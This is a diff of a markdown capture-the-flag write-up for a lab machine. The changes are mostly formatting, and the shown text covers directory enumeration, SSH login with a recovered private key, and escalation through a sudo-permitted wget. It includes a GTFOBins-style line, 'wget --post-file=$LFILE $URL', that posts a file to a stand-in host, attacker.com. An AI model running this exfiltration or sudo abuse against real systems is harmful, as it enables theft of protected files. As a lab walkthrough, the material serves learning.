@@ -43,7 +43,7 @@ Target: http://10.10.251.64
 Task Completed
 ~~~
 
-* Connecting to http://10.10.251.64/sitemap/ shows a blog. It seems to be a wordpress installation using the unapp them from colorlib, but it's actually a fake wordpress installation (no `wp-login` or `wp-admin` path, all links are fake). Let's confirm what directories we have under `/sitemap/`:
+* Connecting to http://10.10.251.64/sitemap/ shows a blog. It seems to be a wordpress installation using the unapp theme from colorlib, but it's actually a fake wordpress installation (no `wp-login` or `wp-admin` path, all links are fake). Let's confirm what directories we have under `/sitemap/`:
 
 ~~~
 $ /data/src/dirsearch/dirsearch.py -u http://10.10.251.64/sitemap -E -w /data/src/wordlists/common.txt 
@@ -148,11 +148,13 @@ The offset is due to a comment that has been added to the page: `Jessie don't fo
 Let's check:
 
 ~~~
-chmod 600 id_rsa
-ssh -i id_rsa jessie@10.10.251.64
+$ chmod 600 id_rsa
+$ ssh -i id_rsa jessie@10.10.251.64
 ~~~
 
-It works! Our flag is in the `Documents` folder:
+It works! We are now connected.
+
+Our flag is in the `Documents` folder:
 
 ~~~
 jessie@CorpOne:~$ ls -l
@@ -194,15 +196,15 @@ User jessie may run the following commands on CorpOne:
     (root) NOPASSWD: /usr/bin/wget
 ~~~
 
-We can run `wget` as root without password. Let's check [here](https://gtfobins.github.io/gtfobins/wget/) what we can do with it.
+We can run `wget` as `root` without password. Let's check [here](https://gtfobins.github.io/gtfobins/wget/) what we can do with it.
 
 We can upload a file with sudo access:
 
-~~~
+```bash
 export URL=http://attacker.com/
 export LFILE=file_to_send
 wget --post-file=$LFILE $URL
-~~~
+```
 
 As the first flag was named `user_flag.txt`, the root flag will likely be `root_flag.txt`. Let's try... First open a listener on your local machine:
 
